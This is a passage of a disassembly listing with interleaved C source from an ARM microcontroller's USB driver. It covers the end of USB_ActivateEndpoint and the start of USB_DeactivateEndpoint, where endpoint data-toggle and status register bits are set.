 80065e8:	005b      	lsls	r3, r3, #1
 80065ea:	b29a      	uxth	r2, r3
 80065ec:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80065ee:	801a      	strh	r2, [r3, #0]
 80065f0:	687b      	ldr	r3, [r7, #4]
 80065f2:	657b      	str	r3, [r7, #84]	; 0x54
 80065f4:	687b      	ldr	r3, [r7, #4]
 80065f6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80065fa:	b29b      	uxth	r3, r3
 80065fc:	461a      	mov	r2, r3
 80065fe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8006600:	4413      	add	r3, r2
 8006602:	657b      	str	r3, [r7, #84]	; 0x54
 8006604:	683b      	ldr	r3, [r7, #0]
 8006606:	781b      	ldrb	r3, [r3, #0]
 8006608:	00da      	lsls	r2, r3, #3
 800660a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800660c:	4413      	add	r3, r2
 800660e:	f203 4304 	addw	r3, r3, #1028	; 0x404
 8006612:	653b      	str	r3, [r7, #80]	; 0x50
 8006614:	683b      	ldr	r3, [r7, #0]
 8006616:	895b      	ldrh	r3, [r3, #10]
 8006618:	085b      	lsrs	r3, r3, #1
 800661a:	b29b      	uxth	r3, r3
 800661c:	005b      	lsls	r3, r3, #1
 800661e:	b29a      	uxth	r2, r3
 8006620:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8006622:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 8006624:	683b      	ldr	r3, [r7, #0]
 8006626:	785b      	ldrb	r3, [r3, #1]
 8006628:	2b00      	cmp	r3, #0
 800662a:	f040 8093 	bne.w	8006754 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800662e:	687a      	ldr	r2, [r7, #4]
 8006630:	683b      	ldr	r3, [r7, #0]
 8006632:	781b      	ldrb	r3, [r3, #0]
 8006634:	009b      	lsls	r3, r3, #2
 8006636:	4413      	add	r3, r2
 8006638:	881b      	ldrh	r3, [r3, #0]
 800663a:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 800663e:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8006642:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006646:	2b00      	cmp	r3, #0
 8006648:	d01b      	beq.n	8006682 <USB_ActivateEndpoint+0x52a>
 800664a:	687a      	ldr	r2, [r7, #4]
 800664c:	683b      	ldr	r3, [r7, #0]
 800664e:	781b      	ldrb	r3, [r3, #0]
 8006650:	009b      	lsls	r3, r3, #2
 8006652:	4413      	add	r3, r2
 8006654:	881b      	ldrh	r3, [r3, #0]
 8006656:	b29b      	uxth	r3, r3
 8006658:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800665c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006660:	87fb      	strh	r3, [r7, #62]	; 0x3e
 8006662:	687a      	ldr	r2, [r7, #4]
 8006664:	683b      	ldr	r3, [r7, #0]
 8006666:	781b      	ldrb	r3, [r3, #0]
 8006668:	009b      	lsls	r3, r3, #2
 800666a:	441a      	add	r2, r3
 800666c:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 800666e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006672:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006676:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800667a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800667e:	b29b      	uxth	r3, r3
 8006680:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006682:	687a      	ldr	r2, [r7, #4]
 8006684:	683b      	ldr	r3, [r7, #0]
 8006686:	781b      	ldrb	r3, [r3, #0]
 8006688:	009b      	lsls	r3, r3, #2
 800668a:	4413      	add	r3, r2
 800668c:	881b      	ldrh	r3, [r3, #0]
 800668e:	87bb      	strh	r3, [r7, #60]	; 0x3c
 8006690:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 8006692:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006696:	2b00      	cmp	r3, #0
 8006698:	d01b      	beq.n	80066d2 <USB_ActivateEndpoint+0x57a>
 800669a:	687a      	ldr	r2, [r7, #4]
 800669c:	683b      	ldr	r3, [r7, #0]
 800669e:	781b      	ldrb	r3, [r3, #0]
 80066a0:	009b      	lsls	r3, r3, #2
 80066a2:	4413      	add	r3, r2
 80066a4:	881b      	ldrh	r3, [r3, #0]
 80066a6:	b29b      	uxth	r3, r3
 80066a8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066ac:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066b0:	877b      	strh	r3, [r7, #58]	; 0x3a
 80066b2:	687a      	ldr	r2, [r7, #4]
 80066b4:	683b      	ldr	r3, [r7, #0]
 80066b6:	781b      	ldrb	r3, [r3, #0]
 80066b8:	009b      	lsls	r3, r3, #2
 80066ba:	441a      	add	r2, r3
 80066bc:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 80066be:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066c2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066c6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066ca:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80066ce:	b29b      	uxth	r3, r3
 80066d0:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80066d2:	687a      	ldr	r2, [r7, #4]
 80066d4:	683b      	ldr	r3, [r7, #0]
 80066d6:	781b      	ldrb	r3, [r3, #0]
 80066d8:	009b      	lsls	r3, r3, #2
 80066da:	4413      	add	r3, r2
 80066dc:	881b      	ldrh	r3, [r3, #0]
 80066de:	b29b      	uxth	r3, r3
 80066e0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80066e4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80066e8:	873b      	strh	r3, [r7, #56]	; 0x38
 80066ea:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80066ec:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80066f0:	873b      	strh	r3, [r7, #56]	; 0x38
 80066f2:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80066f4:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80066f8:	873b      	strh	r3, [r7, #56]	; 0x38
 80066fa:	687a      	ldr	r2, [r7, #4]
 80066fc:	683b      	ldr	r3, [r7, #0]
 80066fe:	781b      	ldrb	r3, [r3, #0]
 8006700:	009b      	lsls	r3, r3, #2
 8006702:	441a      	add	r2, r3
 8006704:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 8006706:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800670a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800670e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006712:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006716:	b29b      	uxth	r3, r3
 8006718:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800671a:	687a      	ldr	r2, [r7, #4]
 800671c:	683b      	ldr	r3, [r7, #0]
 800671e:	781b      	ldrb	r3, [r3, #0]
 8006720:	009b      	lsls	r3, r3, #2
 8006722:	4413      	add	r3, r2
 8006724:	881b      	ldrh	r3, [r3, #0]
 8006726:	b29b      	uxth	r3, r3
 8006728:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800672c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006730:	86fb      	strh	r3, [r7, #54]	; 0x36
 8006732:	687a      	ldr	r2, [r7, #4]
 8006734:	683b      	ldr	r3, [r7, #0]
 8006736:	781b      	ldrb	r3, [r3, #0]
 8006738:	009b      	lsls	r3, r3, #2
 800673a:	441a      	add	r2, r3
 800673c:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 800673e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006742:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006746:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800674a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800674e:	b29b      	uxth	r3, r3
 8006750:	8013      	strh	r3, [r2, #0]
 8006752:	e0bc      	b.n	80068ce <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006754:	687a      	ldr	r2, [r7, #4]
 8006756:	683b      	ldr	r3, [r7, #0]
 8006758:	781b      	ldrb	r3, [r3, #0]
 800675a:	009b      	lsls	r3, r3, #2
 800675c:	4413      	add	r3, r2
 800675e:	881b      	ldrh	r3, [r3, #0]
 8006760:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8006764:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8006768:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800676c:	2b00      	cmp	r3, #0
 800676e:	d01d      	beq.n	80067ac <USB_ActivateEndpoint+0x654>
 8006770:	687a      	ldr	r2, [r7, #4]
 8006772:	683b      	ldr	r3, [r7, #0]
 8006774:	781b      	ldrb	r3, [r3, #0]
 8006776:	009b      	lsls	r3, r3, #2
 8006778:	4413      	add	r3, r2
 800677a:	881b      	ldrh	r3, [r3, #0]
 800677c:	b29b      	uxth	r3, r3
 800677e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006782:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006786:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 800678a:	687a      	ldr	r2, [r7, #4]
 800678c:	683b      	ldr	r3, [r7, #0]
 800678e:	781b      	ldrb	r3, [r3, #0]
 8006790:	009b      	lsls	r3, r3, #2
 8006792:	441a      	add	r2, r3
 8006794:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006798:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800679c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067a0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80067a4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067a8:	b29b      	uxth	r3, r3
 80067aa:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80067ac:	687a      	ldr	r2, [r7, #4]
 80067ae:	683b      	ldr	r3, [r7, #0]
 80067b0:	781b      	ldrb	r3, [r3, #0]
 80067b2:	009b      	lsls	r3, r3, #2
 80067b4:	4413      	add	r3, r2
 80067b6:	881b      	ldrh	r3, [r3, #0]
 80067b8:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 80067bc:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 80067c0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80067c4:	2b00      	cmp	r3, #0
 80067c6:	d01d      	beq.n	8006804 <USB_ActivateEndpoint+0x6ac>
 80067c8:	687a      	ldr	r2, [r7, #4]
 80067ca:	683b      	ldr	r3, [r7, #0]
 80067cc:	781b      	ldrb	r3, [r3, #0]
 80067ce:	009b      	lsls	r3, r3, #2
 80067d0:	4413      	add	r3, r2
 80067d2:	881b      	ldrh	r3, [r3, #0]
 80067d4:	b29b      	uxth	r3, r3
 80067d6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067da:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067de:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80067e2:	687a      	ldr	r2, [r7, #4]
 80067e4:	683b      	ldr	r3, [r7, #0]
 80067e6:	781b      	ldrb	r3, [r3, #0]
 80067e8:	009b      	lsls	r3, r3, #2
 80067ea:	441a      	add	r2, r3
 80067ec:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 80067f0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067f4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067f8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80067fc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006800:	b29b      	uxth	r3, r3
 8006802:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 8006804:	683b      	ldr	r3, [r7, #0]
 8006806:	78db      	ldrb	r3, [r3, #3]
 8006808:	2b01      	cmp	r3, #1
 800680a:	d024      	beq.n	8006856 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 800680c:	687a      	ldr	r2, [r7, #4]
 800680e:	683b      	ldr	r3, [r7, #0]
 8006810:	781b      	ldrb	r3, [r3, #0]
 8006812:	009b      	lsls	r3, r3, #2
 8006814:	4413      	add	r3, r2
 8006816:	881b      	ldrh	r3, [r3, #0]
 8006818:	b29b      	uxth	r3, r3
 800681a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800681e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006822:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006826:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 800682a:	f083 0320 	eor.w	r3, r3, #32
 800682e:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 8006832:	687a      	ldr	r2, [r7, #4]
 8006834:	683b      	ldr	r3, [r7, #0]
 8006836:	781b      	ldrb	r3, [r3, #0]
 8006838:	009b      	lsls	r3, r3, #2
 800683a:	441a      	add	r2, r3
 800683c:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006840:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006844:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006848:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800684c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006850:	b29b      	uxth	r3, r3
 8006852:	8013      	strh	r3, [r2, #0]
 8006854:	e01d      	b.n	8006892 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006856:	687a      	ldr	r2, [r7, #4]
 8006858:	683b      	ldr	r3, [r7, #0]
 800685a:	781b      	ldrb	r3, [r3, #0]
 800685c:	009b      	lsls	r3, r3, #2
 800685e:	4413      	add	r3, r2
 8006860:	881b      	ldrh	r3, [r3, #0]
 8006862:	b29b      	uxth	r3, r3
 8006864:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006868:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800686c:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 8006870:	687a      	ldr	r2, [r7, #4]
 8006872:	683b      	ldr	r3, [r7, #0]
 8006874:	781b      	ldrb	r3, [r3, #0]
 8006876:	009b      	lsls	r3, r3, #2
 8006878:	441a      	add	r2, r3
 800687a:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 800687e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006882:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006886:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800688a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800688e:	b29b      	uxth	r3, r3
 8006890:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006892:	687a      	ldr	r2, [r7, #4]
 8006894:	683b      	ldr	r3, [r7, #0]
 8006896:	781b      	ldrb	r3, [r3, #0]
 8006898:	009b      	lsls	r3, r3, #2
 800689a:	4413      	add	r3, r2
 800689c:	881b      	ldrh	r3, [r3, #0]
 800689e:	b29b      	uxth	r3, r3
 80068a0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80068a4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068a8:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 80068ac:	687a      	ldr	r2, [r7, #4]
 80068ae:	683b      	ldr	r3, [r7, #0]
 80068b0:	781b      	ldrb	r3, [r3, #0]
 80068b2:	009b      	lsls	r3, r3, #2
 80068b4:	441a      	add	r2, r3
 80068b6:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 80068ba:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068be:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068c2:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068c6:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068ca:	b29b      	uxth	r3, r3
 80068cc:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 80068ce:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 80068d2:	4618      	mov	r0, r3
 80068d4:	3774      	adds	r7, #116	; 0x74
 80068d6:	46bd      	mov	sp, r7
 80068d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80068dc:	4770      	bx	lr
 80068de:	bf00      	nop

080068e0 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80068e0:	b480      	push	{r7}
 80068e2:	b08d      	sub	sp, #52	; 0x34
 80068e4:	af00      	add	r7, sp, #0
 80068e6:	6078      	str	r0, [r7, #4]
 80068e8:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80068ea:	683b      	ldr	r3, [r7, #0]
 80068ec:	7b1b      	ldrb	r3, [r3, #12]
 80068ee:	2b00      	cmp	r3, #0
 80068f0:	f040 808e 	bne.w	8006a10 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 80068f4:	683b      	ldr	r3, [r7, #0]
 80068f6:	785b      	ldrb	r3, [r3, #1]
 80068f8:	2b00      	cmp	r3, #0
 80068fa:	d044      	beq.n	8006986 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80068fc:	687a      	ldr	r2, [r7, #4]
 80068fe:	683b      	ldr	r3, [r7, #0]
 8006900:	781b      	ldrb	r3, [r3, #0]
 8006902:	009b      	lsls	r3, r3, #2
 8006904:	4413      	add	r3, r2
 8006906:	881b      	ldrh	r3, [r3, #0]
 8006908:	81bb      	strh	r3, [r7, #12]
 800690a:	89bb      	ldrh	r3, [r7, #12]
 800690c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006910:	2b00      	cmp	r3, #0
 8006912:	d01b      	beq.n	800694c <USB_DeactivateEndpoint+0x6c>
 8006914:	687a      	ldr	r2, [r7, #4]
 8006916:	683b      	ldr	r3, [r7, #0]
 8006918:	781b      	ldrb	r3, [r3, #0]
 800691a:	009b      	lsls	r3, r3, #2
 800691c:	4413      	add	r3, r2
 800691e:	881b      	ldrh	r3, [r3, #0]
 8006920:	b29b      	uxth	r3, r3
 8006922:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006926:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800692a:	817b      	strh	r3, [r7, #10]
 800692c:	687a      	ldr	r2, [r7, #4]
 800692e:	683b      	ldr	r3, [r7, #0]
 8006930:	781b      	ldrb	r3, [r3, #0]
 8006932:	009b      	lsls	r3, r3, #2
 8006934:	441a      	add	r2, r3
 8006936:	897b      	ldrh	r3, [r7, #10]
 8006938:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800693c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006940:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006944:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006948:	b29b      	uxth	r3, r3
 800694a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800694c:	687a      	ldr	r2, [r7, #4]
 800694e:	683b      	ldr	r3, [r7, #0]
 8006950:	781b      	ldrb	r3, [r3, #0]
 8006952:	009b      	lsls	r3, r3, #2
 8006954:	4413      	add	r3, r2
 8006956:	881b      	ldrh	r3, [r3, #0]
 8006958:	b29b      	uxth	r3, r3
 800695a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800695e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006962:	813b      	strh	r3, [r7, #8]
 8006964:	687a      	ldr	r2, [r7, #4]
 8006966:	683b      	ldr	r3, [r7, #0]
 8006968:	781b      	ldrb	r3, [r3, #0]
 800696a:	009b      	lsls	r3, r3, #2
 800696c:	441a      	add	r2, r3
 800696e:	893b      	ldrh	r3, [r7, #8]
 8006970:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006974:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006978:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800697c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006980:	b29b      	uxth	r3, r3
 8006982:	8013      	strh	r3, [r2, #0]
 8006984:	e192      	b.n	8006cac <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006986:	687a      	ldr	r2, [r7, #4]
 8006988:	683b      	ldr	r3, [r7, #0]
 800698a:	781b      	ldrb	r3, [r3, #0]
 800698c:	009b      	lsls	r3, r3, #2
 800698e:	4413      	add	r3, r2
 8006990:	881b      	ldrh	r3, [r3, #0]
 8006992:	827b      	strh	r3, [r7, #18]
 8006994:	8a7b      	ldrh	r3, [r7, #18]
 8006996:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800699a:	2b00      	cmp	r3, #0
 800699c:	d01b      	beq.n	80069d6 <USB_DeactivateEndpoint+0xf6>
 800699e:	687a      	ldr	r2, [r7, #4]
 80069a0:	683b      	ldr	r3, [r7, #0]
 80069a2:	781b      	ldrb	r3, [r3, #0]
 80069a4:	009b      	lsls	r3, r3, #2
 80069a6:	4413      	add	r3, r2
 80069a8:	881b      	ldrh	r3, [r3, #0]
 80069aa:	b29b      	uxth	r3, r3
 80069ac:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80069b0:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069b4:	823b      	strh	r3, [r7, #16]
 80069b6:	687a      	ldr	r2, [r7, #4]
 80069b8:	683b      	ldr	r3, [r7, #0]
 80069ba:	781b      	ldrb	r3, [r3, #0]
 80069bc:	009b      	lsls	r3, r3, #2
 80069be:	441a      	add	r2, r3
 80069c0:	8a3b      	ldrh	r3, [r7, #16]
 80069c2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069c6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069ca:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80069ce:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069d2:	b29b      	uxth	r3, r3
 80069d4:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80069d6:	687a      	ldr	r2, [r7, #4]
 80069d8:	683b      	ldr	r3, [r7, #0]
 80069da:	781b      	ldrb	r3, [r3, #0]
 80069dc:	009b      	lsls	r3, r3, #2
 80069de:	4413      	add	r3, r2
 80069e0:	881b      	ldrh	r3, [r3, #0]
 80069e2:	b29b      	uxth	r3, r3
 80069e4:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80069e8:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069ec:	81fb      	strh	r3, [r7, #14]
 80069ee:	687a      	ldr	r2, [r7, #4]
 80069f0:	683b      	ldr	r3, [r7, #0]
 80069f2:	781b      	ldrb	r3, [r3, #0]
 80069f4:	009b      	lsls	r3, r3, #2
 80069f6:	441a      	add	r2, r3
 80069f8:	89fb      	ldrh	r3, [r7, #14]
 80069fa:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069fe:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a02:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006a06:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a0a:	b29b      	uxth	r3, r3
 8006a0c:	8013      	strh	r3, [r2, #0]
 8006a0e:	e14d      	b.n	8006cac <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 8006a10:	683b      	ldr	r3, [r7, #0]
 8006a12:	785b      	ldrb	r3, [r3, #1]
 8006a14:	2b00      	cmp	r3, #0
 8006a16:	f040 80a5 	bne.w	8006b64 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006a1a:	687a      	ldr	r2, [r7, #4]
 8006a1c:	683b      	ldr	r3, [r7, #0]
 8006a1e:	781b      	ldrb	r3, [r3, #0]
 8006a20:	009b      	lsls	r3, r3, #2
 8006a22:	4413      	add	r3, r2
 8006a24:	881b      	ldrh	r3, [r3, #0]
 8006a26:	843b      	strh	r3, [r7, #32]
 8006a28:	8c3b      	ldrh	r3, [r7, #32]
 8006a2a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006a2e:	2b00      	cmp	r3, #0
 8006a30:	d01b      	beq.n	8006a6a <USB_DeactivateEndpoint+0x18a>
 8006a32:	687a      	ldr	r2, [r7, #4]
 8006a34:	683b      	ldr	r3, [r7, #0]
 8006a36:	781b      	ldrb	r3, [r3, #0]
 8006a38:	009b      	lsls	r3, r3, #2
 8006a3a:	4413      	add	r3, r2
 8006a3c:	881b      	ldrh	r3, [r3, #0]
 8006a3e:	b29b      	uxth	r3, r3
 8006a40:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a44:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a48:	83fb      	strh	r3, [r7, #30]
 8006a4a:	687a      	ldr	r2, [r7, #4]
 8006a4c:	683b      	ldr	r3, [r7, #0]
 8006a4e:	781b      	ldrb	r3, [r3, #0]
 8006a50:	009b      	lsls	r3, r3, #2
 8006a52:	441a      	add	r2, r3
 8006a54:	8bfb      	ldrh	r3, [r7, #30]
 8006a56:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006a5a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006a5e:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006a62:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006a66:	b29b      	uxth	r3, r3
 8006a68:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006a6a:	687a      	ldr	r2, [r7, #4]
 8006a6c:	683b      	ldr	r3, [r7, #0]
 8006a6e:	781b      	ldrb	r3, [r3, #0]
 8006a70:	009b      	lsls	r3, r3, #2
 8006a72:	4413      	add	r3, r2
 8006a74:	881b      	ldrh	r3, [r3, #0]
 8006a76:	83bb      	strh	r3, [r7, #28]
 8006a78:	8bbb      	ldrh	r3, [r7, #28]
 8006a7a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006a7e:	2b00      	cmp	r3, #0
 8006a80:	d01b      	beq.n	8006aba <USB_DeactivateEndpoint+0x1da>
 8006a82:	687a      	ldr	r2, [r7, #4]
 8006a84:	683b      	ldr	r3, [r7, #0]
 8006a86:	781b      	ldrb	r3, [r3, #0]
 8006a88:	009b      	lsls	r3, r3, #2
 8006a8a:	4413      	add	r3, r2
 8006a8c:	881b      	ldrh	r3, [r3, #0]
 8006a8e:	b29b      	uxth	r3, r3
 8006a90:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006a94:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006a98:	837b      	strh	r3, [r7, #26]
 8006a9a:	687a      	ldr	r2, [r7, #4]
 8006a9c:	683b      	ldr	r3, [r7, #0]
 8006a9e:	781b      	ldrb	r3, [r3, #0]
 8006aa0:	009b      	lsls	r3, r3, #2
 8006aa2:	441a      	add	r2, r3
 8006aa4:	8b7b      	ldrh	r3, [r7, #26]
 8006aa6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006aaa:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006aae:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006ab2:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006ab6:	b29b      	uxth	r3, r3
 8006ab8:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 8006aba:	687a      	ldr	r2, [r7, #4]
 8006abc:	683b      	ldr	r3, [r7, #0]
 8006abe:	781b      	ldrb	r3, [r3, #0]
 8006ac0:	009b      	lsls	r3, r3, #2
 8006ac2:	4413      	add	r3, r2
 8006ac4:	881b      	ldrh	r3, [r3, #0]
 8006ac6:	b29b      	uxth	r3, r3
